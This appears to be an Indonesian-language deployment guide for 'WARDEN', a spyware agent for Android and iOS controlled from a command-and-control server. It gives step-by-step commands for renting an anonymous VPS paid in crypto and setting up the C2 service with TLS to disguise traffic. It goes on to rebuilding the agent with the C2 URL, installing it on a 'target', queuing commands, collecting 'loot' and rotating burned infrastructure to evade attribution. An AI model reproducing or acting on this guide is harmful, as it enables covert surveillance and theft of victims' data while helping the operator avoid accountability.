# WARDEN — Deploy ke VPS

Alur lengkap: beli VPS → setup C2 → (opsional) domain+TLS → rebuild agent
dengan URL baru → install di target.

## 1. Beli VPS

| Provider | Harga/mo | Spek entry | Catatan |
|---|---|---|---|
| Hetzner CX22 | ~€4 | 2 vCPU / 4GB / 40GB | harga/terbaik, lokasi EU |
| DigitalOcean | $6 | 1 vCPU / 1GB / 25GB | gampang, dokumentasi lengkap |
| Vultr | $6 | 1 vCPU / 1GB / 25GB | banyak lokasi |
| OVH VPS | ~$4 | 2 vCPU / 2GB | murah, panel ribet |
| RackNerd | ~$11/tahun promo | – | promo tahunan, abuse policy longgar |

Minimal: 1 vCPU / 1GB RAM / 20GB disk, Debian 12. Pilih lokasi jauh dari
target dan dari lo (OPSEC). Bayar crypto kalau provider dukung (Bitcoin/
Monero) supaya gak ada jejak payment.

## 2. Setup C2 (satu perintah)

```bash
# di VPS (sebagai root)
scp -r warden/c2 warden/deploy root@<vps-ip>:/tmp/
ssh root@<vps-ip>
bash /tmp/deploy/setup.sh 8000
```

Yang dilakukan `setup.sh`:
- install python3 + ufw
- bikin user `warden-c2` (no login)
- copy C2 ke `/opt/warden`
- systemd service `warden-c2` (auto-restart kalau crash/reboot)
- firewall: buka 22 + 8000, sisanya tutup
- health check: curl `/api/agents` — kalau gagal, print journal

Cek: `systemctl status warden-c2`, `journalctl -u warden-c2 -f`

## 3. (Opsional tapi disarankan) Domain + TLS

iOS butuh TLS kalau push notification dipakai; plain HTTP tetap jalan
(ATS dimatikan di Info.plist). TLS juga bikin traffic gak obvious.

```bash
# di VPS
apt install -y caddy
# edit deploy/Caddyfile: ganti warden.example.com + email
cp deploy/Caddyfile /etc/caddy/Caddyfile
systemctl restart caddy
```

DNS: A record `warden.example.com` → IP VPS. Caddy ambil Let's Encrypt
cert otomatis. Beli domain pakaian privacy WHOIS + crypto.

## 4. Rebuild agent dengan URL C2 baru

```bash
# di mesin lo (Windows)
cd warden
bash deploy/set_c2.sh http://<vps-ip>:8000        # atau https://warden.example.com
bash build.sh                                       # -> warden.apk
# iOS: copy ios/ ke Mac -> xcodegen generate -> Xcode -> archive
```

`set_c2.sh` rewrite URL di `Prefs.java` (Android) + `Prefs.swift` (iOS)
sekaligus — gak perlu edit manual.

## 5. Verifikasi end-to-end sebelum install

```bash
# dari mesin mana saja
curl http://<vps-ip>:8000/api/agents              # harus balik []
# queue command dummy ke agent id setelah install pertama
curl -X POST http://<vps-ip>:8000/api/queue \
  -H 'Content-Type: application/json' \
  -d '{"agent_id":"<id>","cmd":"info","args":""}'
```

## 6. Operasional

- Panel: `http://<vps-ip>:8000/` (atau domain) — agent list, command, loot
- Loot tersimpan di `/opt/warden/loot/<agent_id>/` — **backup + clear berkala**,
  jangan sampe disk penuh
- Rotasi: kalau IP/domain kena burn, ganti VPS, `set_c2.sh` URL baru, rebuild,
  re-install. Agent lama yang masih beacon ke URL mati = indikasi target
  masih hidup
- Log: `journalctl -u warden-c2` — C2 gak nulis log ke disk sendiri (quiet mode)

## Hardening opsional

- Non-standard port (jangan 8000): `bash setup.sh 44391`
- Fail2ban buat port SSH
- Reverse proxy + basic auth di atas panel (`/` route) kalau domain publik
- Jangan pernah expose panel ke search engine / jangan pakai domain yang
  nyambung ke identitas lo
